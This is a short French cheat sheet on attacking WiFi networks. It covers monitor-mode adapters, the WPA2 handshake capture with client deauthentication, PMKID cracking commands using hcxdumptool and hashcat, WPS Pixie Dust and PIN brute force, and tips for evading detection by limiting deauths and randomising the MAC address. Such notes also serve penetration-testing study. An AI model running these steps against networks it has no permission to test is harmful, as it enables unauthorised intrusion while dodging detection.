# WiFi — bases

## Matos requis

- Carte WiFi qui supporte le **mode monitor** + **injection** :
  - Alfa AWUS036NHA, AWUS036ACH, AWUS1900
  - Panda PAU09
  - Tout ce qui a un chipset Atheros AR9271, Realtek RTL8812AU/RTL8821AU, Ralink

## Vérifier le support

```bash
sudo iw dev                  # liste interfaces
sudo iw list | grep -A8 "Supported interface modes"  # cherche "monitor"
```

## Bandes

- **2.4 GHz** : canaux 1-14 — meilleure portée, plus encombré
- **5 GHz**   : canaux 36-165 — moins de bruit, débit ++

Beaucoup de cartes ne font QUE 2.4. Vérifie avant.

## Workflow complet WPA2

```
1. monitor on
2. scan (airodump-ng)         → repère BSSID + channel + clients
3. scan ciblé (-w fichier)    → enregistre handshake
4. deauth un client connecté  → le force à se reconnecter
5. handshake capturé ?        → top droite de airodump l'affiche
6. crack avec aircrack/hashcat
7. monitor off
```

## Sans client connecté → PMKID

Beaucoup d'AP modernes leakent un PMKID dans le 1er paquet d'association.
Ça permet de cracker la PSK **sans attendre qu'un client se reconnecte**.

```bash
hcxdumptool -i wlan0mon -w pmkid.pcapng
hcxpcapngtool -o hash.hc22000 pmkid.pcapng
hashcat -m 22000 hash.hc22000 wordlist.txt
```

## WPS — souvent vulnérable

- **Pixie dust** : casse instantané sur ~30% des routeurs avec WPS activé (faille de génération du PIN)
- **Bully/Reaver** classique : bruteforce le PIN à 8 chiffres → ~11000 essais max
- Beaucoup de FAI laissent WPS activé par défaut

## Détection / contournement

- Ne pas spammer : log des deauth dans les box modernes
- Changer MAC : `macchanger -r wlan0mon`
- Channel-hop pendant scan, channel-lock pendant attaque
